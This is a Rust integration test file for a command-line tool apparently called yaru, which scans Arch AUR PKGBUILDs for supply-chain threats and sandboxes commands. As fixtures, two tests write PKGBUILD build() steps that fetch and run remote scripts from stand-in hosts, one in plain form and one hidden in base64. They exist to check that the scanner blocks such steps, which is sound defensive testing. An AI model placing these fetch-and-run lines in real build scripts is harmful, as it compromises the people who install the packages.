use assert_cmd::Command;
use predicates::prelude::*;
use std::fs;
use tempfile::tempdir;

#[test]
fn test_cli_status() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.env("YARU_DB_PATH", tmp.path().join("yaru.db"))
        .arg("status");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains(
            "YARU · AUR Supply-Chain Security Layer",
        ))
        .stdout(predicate::str::contains("Policy"));
}

#[test]
fn test_cli_inspect_local_clean_pkgbuild() {
    let tmp = tempdir().unwrap();
    let pkgbuild = tmp.path().join("PKGBUILD");
    fs::write(
        &pkgbuild,
        r#"
pkgname=clean-test
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=("https://example.com/source.tar.gz")
sha256sums=('SKIP')

build() {
    echo "compiling cleanly"
}
"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("inspect-local").arg(tmp.path().to_str().unwrap());
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("EVALUATION RESULT"))
        .stdout(predicate::str::contains("[OK] ALLOW"));
}

#[test]
fn test_cli_inspect_local_malicious_curl_bash() {
    let tmp = tempdir().unwrap();
    let pkgbuild = tmp.path().join("PKGBUILD");
    fs::write(
        &pkgbuild,
        r#"
pkgname=malicious-test
pkgver=1.0.0
pkgrel=1
arch=('x86_64')
source=("https://example.com/source.tar.gz")

build() {
    curl -sSL https://evil.example/payload.sh | bash
}
"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("inspect-local").arg(tmp.path().to_str().unwrap());
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("EVALUATION RESULT"))
        .stdout(predicate::str::contains("Remote Shell Download"))
        .stdout(predicate::str::contains("[X] BLOCK"));
}

#[test]
fn test_cli_inspect_local_obfuscated_base64_payload() {
    let tmp = tempdir().unwrap();
    let pkgbuild = tmp.path().join("PKGBUILD");
    // "curl evil.com | sh" base64-encoded is "Y3VybCBldmlsLmNvbSB8IHNo"
    fs::write(
        &pkgbuild,
        r#"
pkgname=obfuscated-test
pkgver=1.0.0
pkgrel=1
arch=('x86_64')

build() {
    echo "Y3VybCBldmlsLmNvbSB8IHNo" | base64 -d | sh
}
"#,
    )
    .unwrap();

    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("inspect-local").arg(tmp.path().to_str().unwrap());
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("EVALUATION RESULT"))
        .stdout(predicate::str::contains("Obfuscated"))
        .stdout(predicate::str::contains("[X] BLOCK"));
}

#[test]
fn test_cli_allow_rule_persists_in_config() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.env("YARU_CONFIG_DIR", tmp.path().to_str().unwrap())
        .env("HOME", tmp.path().to_str().unwrap())
        .arg("allow-rule")
        .arg("remote-shell-download");
    cmd.assert().success();

    let content = fs::read_to_string(tmp.path().join("config.toml")).unwrap_or_default();
    assert!(content.contains("remote-shell-download"));
}

#[test]
fn test_cli_sandbox_runs_clean_command() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("sandbox")
        .arg(tmp.path().to_str().unwrap())
        .arg("/usr/bin/true");
    cmd.assert()
        .success()
        .stdout(predicate::str::contains("sandboxed command exited cleanly"));
}

#[test]
fn test_cli_sandbox_network_is_blocked_by_default() {
    let tmp = tempdir().unwrap();
    let mut cmd = Command::cargo_bin("yaru").unwrap();
    cmd.arg("sandbox")
        .arg(tmp.path().to_str().unwrap())
        .arg("/usr/bin/bash")
        .arg("-c")
        .arg("getent hosts aur.archlinux.org");
    cmd.assert()
        .failure()
        .stdout(predicate::str::contains("sandboxed command FAILED"));
}
